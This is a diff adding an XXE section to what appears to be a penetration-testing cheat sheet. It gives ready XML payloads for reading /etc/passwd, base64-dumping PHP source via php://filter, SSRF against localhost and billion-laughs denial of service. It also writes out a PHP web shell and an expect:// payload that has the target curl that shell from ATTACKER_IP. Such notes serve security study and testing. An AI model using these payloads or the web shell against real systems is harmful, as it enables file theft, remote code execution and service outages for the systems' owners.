@@ -793,4 +793,118 @@ $query = "SELECT url FROM documents WHERE uuid = ?";
 
 ---
 
+## 🕵️ XXE: Local File Disclosure
 
+**XML External Entity (XXE)** vulnerabilities occur when a web application parses user-supplied XML without proper validation. This can allow attackers to:
+
+* Read local files
+* Perform SSRF
+* Achieve Remote Code Execution (RCE)
+* Cause Denial of Service (DoS)
+
+### 🔍 Identifying XXE Vulnerabilities
+
+1. **Find XML Entry Points**: Forms or APIs accepting XML input (e.g., contact forms).
+2. **Check Reflection**: Intercept the request (e.g., with Burp Suite), inject custom XML entities, and see if the response reflects them.
+
+#### 📌 Test Payload
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY test "XXE">
+]>
+<email>&test;</email>
+```
+
+* If response returns `XXE`, the app likely parses XML unsafely.
+
+> Tip: Even if the app uses JSON by default, try changing `Content-Type` to `application/xml`.
+
+
+
+## 📂 Reading Local Files
+
+### 🔐 External Entity Injection
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<email>&file;</email>
+```
+
+* Displays contents of the file if successful.
+
+> Works only if the XML parser allows external entity access.
+
+### 📄 Base64 File Disclosure (PHP-Specific)
+
+Used when direct file reading fails due to XML parsing errors (e.g., special characters).
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<email>&file;</email>
+```
+
+* Response will contain base64-encoded data.
+* Use Burp or a decoder to view original source.
+
+> Useful for reading PHP files, config files, or secrets.
+
+## ⚙️ Remote Code Execution (PHP Only)
+
+### 🐚 Deploying a Web Shell via XXE + `expect://`
+
+1. Create shell:
+
+```bash
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+```
+
+2. XXE Payload:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY cmd SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
+]>
+<email>&cmd;</email>
+```
+
+* Downloads and writes a web shell to the server (if `expect` module is enabled).
+
+> `$IFS` replaces spaces to preserve XML syntax.
+
+
+## 🛰️ Other XXE Attacks
+
+### 🔄 Server-Side Request Forgery (SSRF)
+
+* Use XXE to request internal resources:
+
+```xml
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/internal">
+```
+
+> Allows access to localhost-only services like admin panels or metadata APIs.
+
+
+### 💣 Denial of Service (Billion Laughs Attack)
+
+Overloads the parser with recursive entities.
+
+```xml
+<!DOCTYPE lolz [
+  <!ENTITY a0 "LOL">
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  ...
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
+]>
+<email>&a10;</email>
+```
+
+> Can crash vulnerable XML parsers, though most modern ones block it.
+
+---
